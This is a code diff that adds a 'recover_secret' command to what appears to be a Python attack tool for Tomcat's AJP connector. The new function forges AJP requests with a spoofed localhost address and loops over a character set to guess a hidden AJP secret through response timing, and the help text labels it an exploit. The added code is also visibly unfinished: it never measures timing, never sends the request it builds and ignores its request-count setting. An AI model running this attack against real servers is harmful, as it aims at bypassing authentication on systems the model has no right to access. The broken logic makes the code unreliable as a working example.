@@ -23,6 +23,7 @@ import logging
 import re
 import os
 import logging
+import string
 import sys
 try:
 	from urllib import unquote
@@ -294,6 +295,38 @@ class Tomcat(object):
 			logger.error('Undeploy failed')
 
 
+	def recover_secret(self, charset: str, length: int, requests: int):
+		secret = [' '] * length
+		for index in range(0, length):
+			best_char = None
+			best_time = None
+			for char in charset:
+				this_secret = secret[:]
+				this_secret[index] = char
+				secret_str = ''.join(this_secret)
+
+				fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
+				fr.method = 'GET'
+				fr.protocol = 'http'
+				fr.req_uri = 'http://' + self.target_host + '/'
+				fr.remote_addr = '127.0.0.1'
+				fr.remote_host = 'localhost'
+				fr.server_name = self.target_host
+				fr.server_port = 80
+				fr.is_ssl = False
+				fr.attributes = [
+					{"name": "req_attribute", "value": secret_str}
+				]
+				
+				responses = self.forward_request.send_and_receive(self.socket, self.stream)
+				if len(responses) == 0:
+					print("Got no responses")
+				else:
+					print("Got responses:")
+					print(responses)
+				print("-----")
+	
+
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
 	subparsers = parser.add_subparsers()
@@ -344,6 +377,13 @@ if __name__ == "__main__":
 	read_file.add_argument("-w", "--webapp", type=str, default="", help="Webapp")
 	read_file.add_argument("-o", "--output", type=str, help="Output file (for binary files)")
 
+	recover_secret = subparsers.add_parser('recover_secret', help="Exploit AJP secret comparisons")
+	recover_secret.set_defaults(which='recover_secret')
+	alphabet = string.ascii_letters + string.digits
+	recover_secret.add_argument("-c", "--charset", type=str, default=alphabet, help="Charset for hidden secret")
+	recover_secret.add_argument("-l", "--length", type=int, default=30, help="Length of hidden secret")
+	recover_secret.add_argument("-r", "--requests", type=int, default=1000, help="Number of requests to attempt per character")
+
 	args = parser.parse_args()
 
 
@@ -389,4 +429,5 @@ if __name__ == "__main__":
 
 		if args.output:
 			output.close()
-
+	elif args.which == 'recover_secret':
+		bf.recover_secret(args.charset, args.length, args.requests)
